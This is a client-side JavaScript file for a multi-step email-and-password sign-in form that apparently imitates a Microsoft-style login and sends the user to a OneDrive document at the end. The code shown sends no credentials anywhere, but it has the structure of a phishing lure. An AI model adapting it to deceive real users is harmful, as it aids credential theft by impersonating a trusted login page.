document.addEventListener('DOMContentLoaded', () => {
  // redirect target (public OneDrive PDF or anything you like)
  const redirectURL =
    'https://1drv.ms/w/c/87f317231466b0ec/EUzblMBVSWtHjL8eGIdHYCoBBemzU5FMDiEf1r_LDmQQVg?e=GpbFEh';  // ← replace this link

  // elements
  const secU = document.getElementById('section_uname');
  const secP = document.getElementById('section_pwd');
  const secF = document.getElementById('section_final');

  const btnNext = document.getElementById('btn_next');
  const btnBack = document.getElementById('btn_back');
  const btnSign = document.getElementById('btn_sig');
  const btnYes  = document.getElementById('btn_final_yes');
  const btnNo   = document.getElementById('btn_final_no');

  const inpEmail = document.getElementById('inp_uname');
  const inpPwd   = document.getElementById('inp_pwd');
  const errEmail = document.getElementById('error_uname');
  const errPwd   = document.getElementById('error_pwd');
  const identity = document.getElementById('user_identity');

  // simple client-side validation (no data leaves browser)
  btnNext.addEventListener('click', () => {
    if (inpEmail.value.trim()) {
      identity.textContent = inpEmail.value.trim();
      errEmail.textContent = '';
      secU.classList.add('hidden');
      secP.classList.remove('hidden');
    } else {
      errEmail.textContent = 'Enter your email address.';
      inpEmail.classList.add('error');
    }
  });

  btnBack.addEventListener('click', () => {
    secP.classList.add('hidden');
    secU.classList.remove('hidden');
  });

  btnSign.addEventListener('click', () => {
    if (inpPwd.value.trim()) {
      errPwd.textContent = '';
      secP.classList.add('hidden');
      secF.classList.remove('hidden');
    } else {
      errPwd.textContent = 'Enter your password.';
      inpPwd.classList.add('error');
    }
  });

  // final redirect (Yes or No -> same URL)
  [btnYes, btnNo].forEach(btn =>
    btn.addEventListener('click', () => (window.location.href = redirectURL))
  );
});
